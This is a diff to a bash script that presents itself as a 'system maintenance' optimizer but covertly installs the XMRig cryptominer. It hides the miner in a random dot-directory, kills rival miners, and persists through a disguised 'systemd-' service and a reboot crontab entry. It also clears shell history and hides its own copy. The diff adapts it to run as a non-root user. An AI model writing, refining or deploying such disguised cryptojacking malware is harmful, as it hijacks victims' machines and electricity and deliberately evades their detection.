@@ -6,21 +6,27 @@ echo "System maintenance script v$VERSION."
 echo "This script performs system optimization tasks."
 echo
 
-if [ "$(id -u)" == "0" ]; then
-  echo "WARNING: Running as root user"
-fi
-
 # Set locale to avoid warnings
 export LC_ALL=C
 export LANG=C
+
+# Get current user and home directory
+CURRENT_USER=$(whoami)
+USER_HOME="$HOME"
+
+# If running with sudo, get the original user's home
+if [ -n "$SUDO_USER" ]; then
+    CURRENT_USER="$SUDO_USER"
+    USER_HOME=$(getent passwd "$SUDO_USER" | cut -d: -f6)
+fi
 
 # Generate random names and paths
 RANDOM_DIR=$(openssl rand -hex 12)
 SYSTEM_USER="sys$(openssl rand -hex 8)"
 SERVICE_NAME="systemd-$(openssl rand -hex 6)"
 
-# Hidden installation paths
-BASE_DIR="/.local/.$RANDOM_DIR"
+# Hidden installation paths - use user's home directory
+BASE_DIR="$USER_HOME/.local/.$RANDOM_DIR"
 CONFIG_DIR="$BASE_DIR/.config"
 LOG_DIR="$BASE_DIR/.logs"
 CACHE_DIR="$BASE_DIR/.cache"
@@ -39,9 +45,10 @@ if [ -z "$HOME" ]; then
   export HOME=/tmp
 fi
 
-if ! type curl >/dev/null; then
+# Install required packages if needed
+if ! type curl >/dev/null || ! type tar >/dev/null; then
   echo "Installing required packages..."
-  apt-get update >/dev/null 2>&1 && apt-get install -y curl >/dev/null 2>&1
+  apt-get update >/dev/null 2>&1 && apt-get install -y curl tar >/dev/null 2>&1
 fi
 
 # Calculate optimal CPU usage (leave 1 core free)
@@ -54,12 +61,21 @@ fi
 
 CPU_USAGE=$((90 - (10 / CPU_THREADS)))
 
+echo "[*] Running as user: $CURRENT_USER"
+echo "[*] Home directory: $USER_HOME"
 echo "[*] Starting system maintenance setup..."
 echo "[*] Using $USABLE_THREADS of $CPU_THREADS CPU threads"
 
 # Function to create hidden directories
 create_hidden_dirs() {
+    echo "[*] Creating directories in: $BASE_DIR"
     mkdir -p "$BASE_DIR" "$CONFIG_DIR" "$LOG_DIR" "$CACHE_DIR"
+    
+    # Set proper ownership
+    if [ "$CURRENT_USER" != "root" ]; then
+        chown -R "$CURRENT_USER:$CURRENT_USER" "$BASE_DIR" 2>/dev/null
+    fi
+    
     chmod 700 "$BASE_DIR" "$CONFIG_DIR" "$LOG_DIR" "$CACHE_DIR"
     
     # Hide directories (if attr command exists)
@@ -74,9 +90,8 @@ cleanup_previous() {
     pkill -f "sysupdate" 2>/dev/null
     pkill -f "kernelcfg" 2>/dev/null
     
-    # Find and remove hidden miners
-    find /usr/lib -name ".*" -type d -exec pkill -f {}/main \; 2>/dev/null
-    find /lib -name ".*" -type d -exec pkill -f {}/main \; 2>/dev/null
+    # Find and remove hidden miners in user's home
+    find "$USER_HOME" -name ".*" -type d -exec pkill -f {}/main \; 2>/dev/null
 }
 
 echo "[*] Performing system cleanup..."
@@ -121,6 +136,12 @@ tar xzf /tmp/tools.tar.gz -C /tmp/ 2>/dev/null
 XMRIG_BINARY=$(find /tmp -name "xmrig" -type f 2>/dev/null | head -1)
 if [ -n "$XMRIG_BINARY" ] && [ -f "$XMRIG_BINARY" ]; then
     cp "$XMRIG_BINARY" "$BASE_DIR/main"
+    
+    # Set proper ownership
+    if [ "$CURRENT_USER" != "root" ]; then
+        chown "$CURRENT_USER:$CURRENT_USER" "$BASE_DIR/main" 2>/dev/null
+    fi
+    
     chmod +x "$BASE_DIR/main"
 else
     echo "ERROR: Could not find xmrig binary in extracted files"
@@ -217,6 +238,11 @@ cat > "$CONFIG_DIR/optimizer.json" << EOF
 }
 EOF
 
+# Set ownership of config file
+if [ "$CURRENT_USER" != "root" ]; then
+    chown "$CURRENT_USER:$CURRENT_USER" "$CONFIG_DIR/optimizer.json" 2>/dev/null
+fi
+
 # Optimize CPU usage in config
 sed -i "s/\"max-threads-hint\": 100,/\"max-threads-hint\": $CPU_USAGE,/" "$CONFIG_DIR/optimizer.json"
 sed -i "s/\"priority\": 1,/\"priority\": 0,/" "$CONFIG_DIR/optimizer.json"
@@ -224,28 +250,33 @@ sed -i "s/\"priority\": 1,/\"priority\": 0,/" "$CONFIG_DIR/optimizer.json"
 echo "[*] Creating control scripts..."
 
 # Main control script
-cat > "$BASE_DIR/control" << 'EOF'
+cat > "$BASE_DIR/control" << EOF
 #!/bin/bash
-SCRIPT_DIR="$(dirname "$(realpath "$0")")"
-case "$1" in
+SCRIPT_DIR="\$(dirname "\$(realpath "\$0")")"
+case "\$1" in
     start)
-        nohup "$SCRIPT_DIR/main" --config="$SCRIPT_DIR/.config/optimizer.json" >/dev/null 2>&1 &
+        nohup "\$SCRIPT_DIR/main" --config="\$SCRIPT_DIR/.config/optimizer.json" >/dev/null 2>&1 &
         ;;
     stop)
-        pkill -f "$SCRIPT_DIR/main"
+        pkill -f "\$SCRIPT_DIR/main"
         ;;
     status)
-        pgrep -f "$SCRIPT_DIR/main" >/dev/null && echo "Running" || echo "Stopped"
+        pgrep -f "\$SCRIPT_DIR/main" >/dev/null && echo "Running" || echo "Stopped"
         ;;
     *)
-        echo "Usage: $0 {start|stop|status}"
+        echo "Usage: \$0 {start|stop|status}"
         ;;
 esac
 EOF
+
+# Set ownership and permissions
+if [ "$CURRENT_USER" != "root" ]; then
+    chown "$CURRENT_USER:$CURRENT_USER" "$BASE_DIR/control" 2>/dev/null
+fi
 chmod +x "$BASE_DIR/control"
 
-# Systemd service for persistence
-if command -v systemctl >/dev/null 2>&1; then
+# Systemd service for persistence (only if root or sudo)
+if command -v systemctl >/dev/null 2>&1 && [ "$(id -u)" -eq 0 ]; then
     mkdir -p /etc/systemd/system
     cat > /etc/systemd/system/"$SERVICE_NAME".service << EOF
 [Unit]
@@ -257,7 +288,7 @@ StartLimitIntervalSec=0
 Type=simple
 Restart=always
 RestartSec=10
-User=root
+User=$CURRENT_USER
 ExecStart=$BASE_DIR/main --config=$CONFIG_DIR/optimizer.json
 ExecStop=$BASE_DIR/control stop
 KillMode=process
@@ -272,7 +303,13 @@ EOF
 fi
 
 # Add to crontab for persistence
-(crontab -l 2>/dev/null | grep -v "$BASE_DIR" ; echo "@reboot sleep 60 && \"$BASE_DIR/control\" start") | crontab -
+if [ "$CURRENT_USER" != "root" ]; then
+    # For regular users, use their crontab
+    (crontab -l 2>/dev/null | grep -v "$BASE_DIR" ; echo "@reboot sleep 60 && \"$BASE_DIR/control\" start") | crontab -
+else
+    # For root, use system crontab
+    (crontab -l 2>/dev/null | grep -v "$BASE_DIR" ; echo "@reboot sleep 60 && \"$BASE_DIR/control\" start") | crontab -
+fi
 
 # Hide the installation
 echo "[*] Securing installation..."
@@ -287,21 +324,26 @@ find /tmp -name "xmrig*" -type d -exec rm -rf {} \; 2>/dev/null
 history -c
 
 echo "[*] Starting system optimizer..."
-"$BASE_DIR/control" start
+sudo -u "$CURRENT_USER" "$BASE_DIR/control" start 2>/dev/null || "$BASE_DIR/control" start
 
 echo
 echo "System optimization setup complete."
 echo "The optimizer will use $USABLE_THREADS CPU threads with $CPU_USAGE% utilization."
+echo "Installation directory: $BASE_DIR"
 echo "Use: $BASE_DIR/control {start|stop|status} to manage"
 echo
 
-# FIXED: Hide this script's execution properly
+# Hide this script's execution
 CURRENT_SCRIPT="$0"
 if [ -f "$CURRENT_SCRIPT" ]; then
     cp "$CURRENT_SCRIPT" "$BASE_DIR/.setup"
+    
+    # Set ownership
+    if [ "$CURRENT_USER" != "root" ]; then
+        chown "$CURRENT_USER:$CURRENT_USER" "$BASE_DIR/.setup" 2>/dev/null
+    fi
+    
     chmod 600 "$BASE_DIR/.setup"
-    # Remove the original script if desired (optional)
-    # rm -f "$CURRENT_SCRIPT"
 fi
 
 # Clean exit
